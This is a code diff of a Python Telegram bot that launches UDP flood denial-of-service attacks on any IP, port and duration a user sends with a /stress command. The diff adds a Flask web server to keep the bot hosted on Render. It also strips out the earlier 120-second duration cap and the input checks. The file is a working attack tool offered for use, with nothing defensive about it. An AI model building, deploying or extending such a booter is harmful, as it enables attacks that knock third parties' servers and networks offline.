@@ -3,65 +3,54 @@ import socket
 import random
 import time
 import threading
+from flask import Flask
 from telebot import TeleBot
 from dotenv import load_dotenv
 
-# Load variables from .env file
+# --- 1. THE RENDER FIX (Flask Web Server) ---
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is running!"
+
+def run_web_server():
+    # Render provides a 'PORT' environment variable, default to 10000
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
+
+# --- 2. BOT LOGIC ---
 load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
 bot = TeleBot(TOKEN)
 
-# --- Stresser Core ---
 def udp_flood(target_ip, target_port, duration, chat_id, message_id):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes_payload = random._urandom(1024) # 1KB packet
+    bytes_payload = random._urandom(1024)
     timeout = time.time() + duration
     sent = 0
-
     while time.time() < timeout:
         try:
             client.sendto(bytes_payload, (target_ip, target_port))
             sent += 1
-        except Exception:
+        except:
             break
     
-    # Final Render of the result
-    final_text = (
-        f"✅ **STRESS TEST COMPLETE**\n\n"
-        f"🌐 **Target:** `{target_ip}:{target_port}`\n"
-        f"📦 **Packets Sent:** `{sent}`\n"
-        f"⏱ **Duration:** `{duration}s`"
-    )
-    bot.edit_message_text(final_text, chat_id, message_id, parse_mode='Markdown')
-
-# --- Bot Commands ---
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "Welcome. Use `/stress <IP> <Port> <Time>` to begin.")
+    bot.edit_message_text(f"✅ **Done!** Sent `{sent}` packets.", chat_id, message_id, parse_mode='Markdown')
 
 @bot.message_handler(commands=['stress'])
 def handle_stress(message):
     try:
-        args = message.text.split()
-        if len(args) != 4:
-            raise ValueError
+        _, ip, port, sec = message.text.split()
+        sent_msg = bot.reply_to(message, "🚀 **Starting...**", parse_mode='Markdown')
+        threading.Thread(target=udp_flood, args=(ip, int(port), int(sec), message.chat.id, sent_msg.message_id)).start()
+    except:
+        bot.reply_to(message, "Usage: `/stress IP Port Time`")
 
-        ip = args[1]
-        port = int(args[2])
-        sec = int(args[3])
-
-        if sec > 120:
-            return bot.reply_to(message, "❌ Max duration is 120 seconds.")
-
-        # Send initial "Rendering" message
-        sent_msg = bot.reply_to(message, f"🚀 **Initializing Attack on {ip}...**", parse_mode='Markdown')
-
-        # Launch stresser in a background thread
-        threading.Thread(target=udp_flood, args=(ip, port, sec, message.chat.id, sent_msg.message_id)).start()
-
-    except Exception:
-        bot.reply_to(message, "⚠️ **Usage:** `/stress 1.1.1.1 80 30`")
-
+# --- 3. MAIN EXECUTION ---
 if __name__ == "__main__":
-    print("Bot is running...")
+    # Start the Flask server in a separate thread
+    threading.Thread(target=run_web_server, daemon=True).start()
+    
+    print("Web server started. Starting Bot polling...")
     bot.infinity_polling()
